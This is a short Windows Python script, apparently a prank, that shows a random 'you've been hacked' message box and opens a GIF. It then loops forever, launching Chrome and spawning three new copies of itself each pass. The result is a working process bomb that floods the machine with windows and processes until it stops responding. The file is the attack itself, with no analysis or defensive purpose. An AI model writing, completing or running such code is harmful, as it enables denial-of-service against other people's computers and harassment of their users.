import os
import subprocess
import ctypes
import random

possible_strings = ['You\'ve been chromed!', 'You\'ve been hacked by 我在个们!', 'onion owns you', 'es0t owns you']
message_box = ctypes.windll.user32.MessageBoxW


def main():
    message_box(None, possible_strings[random.randint(0, len(possible_strings) - 1)], 'trollage', 0)
    os.system('start https://media.tenor.com/images/2972a25f708c6b9158c026ef1b6584ef/tenor.gif')

    def open1():
        while True:
            os.system('start chrome')
            subprocess.call('python main.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
            subprocess.call('python main.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
            subprocess.call('python main.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)

    open1()


if __name__ == '__main__':
    main()
